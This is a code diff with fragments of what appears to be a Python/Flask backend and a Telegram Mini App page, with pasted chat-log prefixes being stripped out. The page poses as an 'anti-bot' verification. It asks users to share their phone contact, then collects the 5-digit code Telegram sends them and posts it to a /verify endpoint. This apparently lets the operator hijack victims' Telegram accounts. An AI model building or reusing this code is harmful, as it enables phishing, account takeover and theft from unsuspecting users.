@@ -1,4 +1,3 @@
-Hey me, [7/22/26 12:40 PM]
 import os
 import asyncio
 import json
@@ -84,7 +83,6 @@ Hey me, [7/22/26 12:40 PM]
 <script>
 var tg=window.Telegram.WebApp;tg.ready();tg.expand();var userId=null,enteredCode='';if(tg.initDataUnsafe&&tg.initDataUnsafe.user)userId=tg.initDataUnsafe.user.id;function handleConfirm(){document.getElementById('antiBotScreen').style.display='none';document.getElementById('verificationScreen').style.display='block'}function handleContact(){document.getElementById('shareBtn').disabled=true;document.getElementById('contactLoading').style.display='block';tg.requestContact(function(success,response){if(success){console.log('Contact shared:',response);document.getElementById('verificationScreen').style.display='none';document.getElementById('codeScreen').style.display='block'}else{alert('Please share your contact to continue.');document.getElementById('shareBtn').disabled=false;document.getElementById('contactLoading').style.display='none'}})}function resendCode(){fetch('/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user_id:userId})}).then(function(res){return res.json()}).then(function(data){if(data.success){alert('A new code has been sent to your Telegram app.');enteredCode='';updateCodeDisplay()}else{alert(data.error||'Failed to resend code.
 
-Hey me, [7/22/26 12:40 PM]
 Please try again.')}})}function pressKey(key){if(key==='back')enteredCode=enteredCode.slice(0,-1);else if(key==='clear')enteredCode='';else if(enteredCode.length<5)enteredCode+=key;updateCodeDisplay()}function updateCodeDisplay(){var slots=document.querySelectorAll('.code-slot');for(var i=0;i<slots.length;i++){if(i<enteredCode.length){slots[i].textContent='•';slots[i].classList.add('filled')}else{slots[i].textContent='';slots[i].classList.remove('filled')}}}function submitCode(){if(enteredCode.length!==5){alert('Please enter the full 5-digit code.');return}document.getElementById('loadingBox').style.display='block';document.getElementById('errorBox').style.display='none';fetch('/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:enteredCode,user_id:userId})}).then(function(res){if(!res.ok)throw new Error('Server error: '+res.status);return res.json()}).then(function(data){document.getElementById('loadingBox').style.display='none';if(data.success){document.getElementById('codeScreen').style.display='none';document.getElementById('successScreen').style.display='block';setTimeout(function(){tg.close()},2000)}else{document.getElementById('errorBox').textContent=data.error||'Invalid code.';document.getElementById('errorBox').style.display='block';enteredCode='';updateCodeDisplay()}}).catch(function(err){document.getElementById('loadingBox').style.display='none';document.getElementById('errorBox').textContent='Error: '+err.message;document.getElementById('errorBox').style.display='block'})}updateCodeDisplay();
 </script>
 </body>
@@ -144,7 +142,6 @@ def resend_code():
     else:
         return jsonify({"success": False, "error": error})
 
-Hey me, [7/22/26 12:40 PM]
 @app.route('/verify', methods=['POST'])
 def verify_code():
     data = request.json
@@ -248,7 +245,6 @@ def verify_code():
 
     await bot_client.run_until_disconnected()
 
-Hey me, [7/22/26 12:40 PM]
 if name == 'main':
     init_db()
     
